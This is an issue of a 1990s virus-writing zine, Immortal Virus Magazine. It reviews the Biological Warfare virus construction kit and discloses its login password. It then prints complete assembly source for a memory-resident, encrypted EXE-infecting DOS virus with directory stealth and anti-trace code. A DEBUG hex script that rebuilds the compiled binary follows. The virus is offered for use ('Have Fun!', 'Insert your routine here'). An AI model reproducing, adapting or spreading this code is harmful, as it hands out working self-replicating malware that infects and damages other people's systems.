------------------------------Immortal Virus Magazine--------------------------
-----------------------------------Issue 95.1----------------------------------
-----------------------------------Virus Labs----------------------------------
 
 In this section I will test a Virus Lab, this section will return every
  issue.
 In this issue:

Biological Warfare v0.90á by MnemoniX

Some features of this great package:
 + Resident
 + Encryption
 + (Extended) dir stealth
 + COM and/or EXE infections
 + Int 24h handler
 + Anti - Trace code
 + Traverse directory
 + Infections per run can be set to unlimited
 + Check for COM size
 + Check for COMMAND.COM
 + Random .EXE marker
 + .EXE overlay check

Some weaknesses about Biological Warfare:
 - 'Log-in' password
 - Easy to detect
 - No 'configuration files'

The viruses can be made resident, when they are, you can make it infect files
 on: Execution and/or opening of .COM / .EXE files. The encryption is pretty
 good. The anti-trace code works. There really is not much to say about this
 wonderfull package!  Version 1.00 also has a polymorphic engine!

        Score: 8.7
Btw. The log-in password is Lo-Tek
-------------------------------------<CUT>-------------------------------------
; Here is an example of a virus created by Biological Warefare:
; Features:
;  - TSR
;  - EXE infector
;  - Extended DIR stealth
;  - Encrypted
;  - Spread on execution of virus
;Have Fun!
; IVM-Vir.ASM : Download IVM, it's a good magazine (WHQ: +31 (0)77-547477)
; Created with Biological Warfare - Version 0.90á by MnemoniX

PING            equ     0EA93h
PONG            equ     080Eh
STAMP           equ     25
MARKER          equ     04945h

code            segment
                org     0
                assume  cs:code,ds:code

start:
                db      0E9h,3,0          ; to virus
host:
                db      0CDh,20h,0        ; host program
virus_begin:

                db      0BBh                    ; decryption module
code_offset     dw      offset virus_code
                mov     di,VIRUS_SIZE / 2 + 1

decrypt:
                db      02Eh,081h,2Fh           ; SUB CS:[BX]
cipher          dw      0
                inc     bx
                inc     bx
                dec     di
                jnz     decrypt


virus_code:
                call    $ + 3             ; BP is instruction ptr.
                pop     bp
                sub     bp,offset $ - 1

                push    ds es

                cli
                mov     ax,PING           ; mild anti-trace code
                push    ax
                pop     ax
                dec     sp
                dec     sp
                pop     bx
                cmp     ax,bx
                je      no_trace
                hlt

no_trace:
                sti
                in      al,21h            ; lock out & reopen keyboard
                xor     al,2
                out     21h,al
                xor     al,2
                out     21h,al

                mov     ax,PING           ; test for residency
                int     21h
                cmp     dx,PONG
                je      installed

                mov     ax,es                   ; Get PSP
                dec     ax
                mov     ds,ax                   ; Get MCB

                sub     word ptr ds:[3],((MEM_SIZE+1023) / 1024) * 64
                sub     word ptr ds:[12h],((MEM_SIZE+1023) / 1024) * 64
                mov     es,word ptr ds:[12h]

                push    cs                      ; copy virus into memory
                pop     ds
                xor     di,di
                mov     si,bp
                mov     cx,(virus_end - start) / 2 + 1
                rep     movsw

                xor     ax,ax                   ; capture interrupts
                mov     ds,ax

                sub     word ptr ds:[413h],(MEM_SIZE+1023) / 1024

                mov     si,21h * 4              ; get original int 21
                mov     di,offset old_int_21
                movsw
                movsw

                mov     word ptr ds:[si - 4],offset new_int_21
                mov     ds:[si - 2],es          ; and set new int 21

installed:
                call    activate                ; activation routine

                pop     es ds                   ; restore segregs
exe_exit:
                mov     ax,ds                   ; fix up return address
                add     ax,10h
                push    ax
                add     ax,cs:[bp + exe_cs]
                mov     cs:[bp + return_cs],ax

                mov     ax,cs:[bp + exe_ip]
                mov     cs:[bp + return_ip],ax

                pop     ax
                add     ax,cs:[bp + exe_ss]        ; restore stack
                cli
                mov     ss,ax
                mov     sp,cs:[bp + exe_sp]

                call    fix_regs                ; fix up registers
                sti

                db      0EAh                    ; back to host program
return_ip       dw      0
return_cs       dw      0

exe_cs          dw      -16                     ; orig CS:IP
exe_ip          dw      103h
exe_sp          dw      -2                      ; orig SS:SP
exe_ss          dw      -16

fix_regs:
                xor     ax,ax
                cwd
                xor     bx,bx
                mov     si,100h
                xor     di,di
                xor     bp,bp
                ret

; interrupt 21 handler
int_21:
                pushf
                call    dword ptr cs:[old_int_21]
                ret

new_int_21:
                cmp     ax,PING                 ; residency test
                je      ping_pong
                cmp     ah,11h                  ; directory stealth
                je      dir_stealth
                cmp     ah,12h
                je      dir_stealth
                cmp     ah,4Eh                  ; directory stealth
                je      dir_stealth_2
                cmp     ah,4Fh
                je      dir_stealth_2
                cmp     ax,4B00h                ; execute program
                jne     int_21_exit
                jmp     execute
int_21_exit:
                db      0EAh                    ; never mind ...
old_int_21      dd      0

ping_pong:
                mov     dx,PONG
                iret

dir_stealth:
                call    int_21                  ; get dir entry
                test    al,al
                js      dir_stealth_done

                push    ax bx es
                mov     ah,2Fh
                int     21h

                cmp     byte ptr es:[bx],-1     ; check for extended FCB
                jne     no_ext_FCB
                add     bx,7
no_ext_FCB:
                mov     ax,es:[bx + 17h]        ; check for infection marker
                and     al,31
                cmp     al,STAMP
                jne     dir_fixed

                sub     word ptr es:[bx + 1Dh],VIRUS_SIZE + 3
                sbb     word ptr es:[bx + 1Fh],0
dir_fixed:
                pop     es bx ax
dir_stealth_done:
                iret

dir_stealth_2:
                pushf
                call    dword ptr cs:[old_int_21]
                jc      dir_stealth_done_2

check_infect2:
                push    ax bx es

                mov     ah,2Fh
                int     21h
                mov     ax,es:[bx + 16h]
                and     al,31                   ; check timestamp
                cmp     al,STAMP
                jne     fixed_2

                sub     es:[bx + 1Ah],VIRUS_SIZE + 3
                sbb     word ptr es:[bx + 1Ch],0

fixed_2:
                pop     es bx ax
                clc                             ; clear carry
dir_stealth_done_2:
                retf    2
execute:
                push    ax bx cx dx si di ds es

                xor     ax,ax                   ; critical error handler
                mov     es,ax                   ; routine - catch int 24
                mov     es:[24h * 4],offset int_24
                mov     es:[24h * 4 + 2],cs

                mov     ax,4300h                ; change attributes
                int     21h

                push    cx dx ds
                xor     cx,cx
                call    set_attributes

                mov     ax,3D02h                ; open file
                int     21h
                jc      cant_open
                xchg    bx,ax

                push    cs                      ; CS = DS
                pop     ds

                mov     ax,5700h                ; save file date/time
                int     21h
                push    cx dx
                mov     ah,3Fh
                mov     cx,28
                mov     dx,offset read_buffer
                int     21h

                cmp     word ptr read_buffer,'ZM' ; .EXE?
                je      infect_exe              ; yes, infect as .EXE

                jmp     dont_infect

fix_date_time:
                pop     dx cx
                and     cl,-32                  ; add time stamp
                or      cl,STAMP                ; for directory stealth
                mov     ax,5701h                ; restore file date/time
                int     21h

close:
                pop     ds dx cx                ; restore attributes
                call    set_attributes

                mov     ah,3Eh                  ; close file
                int     21h

cant_open:
                pop     es ds di si dx cx bx ax
                jmp     int_21_exit             ; leave


set_attributes:
                mov     ax,4301h
                int     21h
                ret

dont_infect:
                pop     cx dx                   ; can't infect, skip
                jmp     close

infect_exe:
                cmp     word ptr read_buffer[26],0
                jne     dont_infect             ; overlay, don't infect

                cmp     word ptr read_buffer[16],MARKER
                je      dont_infect             ; infected already

                les     ax,dword ptr read_buffer[20]
                mov     exe_cs,es               ; CS
                mov     exe_ip,ax               ; IP

                les     ax,dword ptr read_buffer[14]
                mov     exe_ss,ax               ; SS
                mov     exe_sp,es               ; SP
                mov     word ptr read_buffer[16],MARKER

                mov     ax,4202h                ; to end of file
                cwd
                xor     cx,cx
                int     21h

                push    ax dx                   ; save file size

                push    bx
                mov     cl,12                   ; calculate offsets for CS
                shl     dx,cl                   ; and IP
                mov     bx,ax
                mov     cl,4
                shr     bx,cl
                add     dx,bx
                and     ax,15
                pop     bx

                sub     dx,word ptr read_buffer[8]
                mov     word ptr read_buffer[22],dx
                mov     word ptr read_buffer[20],ax
                add     dx,100
                mov     word ptr read_buffer[14],dx

                pop     dx ax                   ; calculate prog size

                add     ax,VIRUS_SIZE + 3
                adc     dx,0
                mov     cx,512                  ; in pages
                div     cx                      ; then save results
                inc     ax
                mov     word ptr read_buffer[2],dx
                mov     word ptr read_buffer[4],ax
                mov     dx,word ptr read_buffer[20]
                call    encrypt_code            ; encrypt virus


                mov     ah,40h
                mov     cx,VIRUS_SIZE + 3
                mov     dx,offset encrypt_buffer
                int     21h


                mov     ax,4200h                ; back to beginning
                cwd
                xor     cx,cx
                int     21h

                mov     ah,40h                  ; and fix up header
                mov     cx,28
                mov     dx,offset read_buffer
                int     21h
                jmp     fix_date_time           ; done

courtesy_of     db      '[BW]',0
signature       db      'Download IVM, its a good magazine (WHQ: +31 (0)77-547477)',0
birthday        db      'Happy birthday [Hacking Hell] !!',0Ah,0Dh,'$',0

activate:       mov     ah,2ah
                cmp     dx,0B08h
                jne     exit_act
                mov     ah, 09h
                lea     dx, [offset birthday+bp]
                int     21h
       ; Insert your routine here
exit_act:       ret

encrypt_code:
                push    ax cx

                push    dx
                xor     ah,ah                   ; get time for random number
                int     1Ah

                mov     cipher,dx               ; save encryption key
                pop     cx
                add     cx,virus_code - virus_begin
                mov     code_offset,cx          ; save code offset

                push    cs                      ; ES = CS
                pop     es

                mov     si,offset virus_begin   ; move decryption module
                mov     di,offset encrypt_buffer
                mov     cx,virus_code - virus_begin
                rep     movsb

                mov     cx,VIRUS_SIZE / 2 + 1
encrypt:
                lodsw                           ; encrypt virus code
                add     ax,dx
                stosw
                loop    encrypt

                pop     cx ax
                ret

int_24:
                mov     al,3                    ; int 24 handler
                iret
virus_end:
VIRUS_SIZE      equ     virus_end - virus_begin
read_buffer     db      28 dup (?)              ; read buffer
encrypt_buffer  db      VIRUS_SIZE dup (?)      ; encryption buffer

end_heap:

MEM_SIZE        equ     end_heap - start

code            ends
                end     start
-------------------------------------<CUT>-------------------------------------
N IVM-VIR.COM
E 0100 E9 03 00 CD 20 00 BB 16 00 BF 80 01 2E 81 2F 00
E 0110 00 43 43 4F 75 F6 E8 00 00 5D 81 ED 19 00 1E 06 
E 0120 FA B8 93 EA 50 58 4C 4C 5B 3B C3 74 01 F4 FB E4 
E 0130 21 34 02 E6 21 34 02 E6 21 B8 93 EA CD 21 81 FA
E 0140 0E 08 74 3A 8C C0 48 8E D8 81 2E 03 00 80 00 81 
E 0150 2E 12 00 80 00 8E 06 12 00 0E 1F 33 FF 8B F5 B9 
E 0160 83 01 F3 A5 33 C0 8E D8 83 2E 13 04 02 90 BE 84 
E 0170 00 BF F2 00 A5 A5 C7 44 FC D0 00 8C 44 FE E8 43
E 0180 02 07 1F 8C D8 05 10 00 50 2E 03 86 B4 00 2E 89 
E 0190 86 B2 00 2E 8B 86 B6 00 2E 89 86 B0 00 58 2E 03 
E 01A0 86 BA 00 FA 8E D0 2E 8B A6 B8 00 E8 0E 00 FB EA 
E 01B0 00 00 00 00 F0 FF 03 01 FE FF F0 FF 33 C0 99 33 
E 01C0 DB BE 00 01 33 FF 33 ED C3 9C 2E FF 1E F2 00 C3 
E 01D0 3D 93 EA 74 21 80 FC 11 74 20 80 FC 12 74 1B 80 
E 01E0 FC 4E 74 46 80 FC 4F 74 41 3D 00 4B 75 03 EB 65 
E 01F0 90 EA 00 00 00 00 BA 0E 08 CF E8 CC FF 84 C0 78 
E 0200 28 50 53 06 B4 2F CD 21 26 80 3F FF 75 03 83 C3 
E 0210 07 26 8B 47 17 24 1F 3C 19 75 0B 26 81 6F 1D 01
E 0220 03 26 83 5F 1F 00 07 5B 58 CF 9C 2E FF 1E F2 00 
E 0230 72 20 50 53 06 B4 2F CD 21 26 8B 47 16 24 1F 3C
E 0240 19 75 0B 26 81 6F 1A 01 03 26 83 5F 1C 00 07 5B
E 0250 58 F8 CA 02 00 50 53 51 52 56 57 1E 06 33 C0 8E 
E 0260 C0 26 C7 06 90 00 01 03 26 8C 0E 92 00 B8 00 43 
E 0270 CD 21 51 52 1E 33 C9 E8 48 00 B8 02 3D CD 21 72 
E 0280 36 93 0E 1F B8 00 57 CD 21 51 52 B4 3F B9 1C 00 
E 0290 BA 04 03 CD 21 81 3E 04 03 4D 5A 74 2F EB 29 90 
E 02A0 5A 59 80 E1 E0 80 C9 19 B8 01 57 CD 21 1F 5A 59 
E 02B0 E8 0F 00 B4 3E CD 21 07 1F 5F 5E 5A 59 5B 58 E9
E 02C0 2F FF B8 01 43 CD 21 C3 59 5A EB E1 83 3E 1E 03 
E 02D0 00 75 F5 81 3E 14 03 45 49 74 ED C4 06 18 03 8C 
E 02E0 06 B4 00 A3 B6 00 C4 06 12 03 A3 BA 00 8C 06 B8 
E 02F0 00 C7 06 14 03 45 49 B8 02 42 99 33 C9 CD 21 50 
E 0300 52 53 B1 0C D3 E2 8B D8 B1 04 D3 EB 03 D3 25 0F 
E 0310 00 5B 2B 16 0C 03 89 16 1A 03 A3 18 03 83 C2 64 
E 0320 89 16 12 03 5A 58 05 01 03 90 83 D2 00 B9 00 02
E 0330 F7 F1 40 89 16 06 03 A3 08 03 8B 16 18 03 E8 94 
E 0340 00 B4 40 B9 01 03 90 BA 20 03 CD 21 B8 00 42 99 
E 0350 33 C9 CD 21 B4 40 B9 1C 00 BA 04 03 CD 21 E9 3F
E 0360 FF 5B 42 57 5D 00 44 6F 77 6E 6C 6F 61 64 20 49 
E 0370 56 4D 2C 20 69 74 73 20 61 20 67 6F 6F 64 20 6D
E 0380 61 67 61 7A 69 6E 65 20 28 57 48 51 3A 20 2B 33 
E 0390 31 20 28 30 29 37 37 2D 35 34 37 34 37 37 29 00 
E 03A0 48 61 70 70 79 20 62 69 72 74 68 64 61 79 20 5B 
E 03B0 48 61 63 6B 69 6E 67 20 48 65 6C 6C 5D 20 21 21 
E 03C0 0A 0D 24 00 B4 2A 81 FA 08 0B 75 08 B4 09 8D 96 
E 03D0 A0 02 CD 21 C3 50 51 52 32 E4 CD 1A 89 16 0F 00 
E 03E0 59 83 C1 10 89 0E 07 00 0E 07 BE 06 00 BF 20 03 
E 03F0 B9 10 00 F3 A4 B9 80 01 AD 03 C2 AB E2 FA 59 58
E 0400 C3 B0 03 CF
RCX
0304
W
Q
-------------------------------------<CUT>-------------------------------------
 By: [Hacking Hell]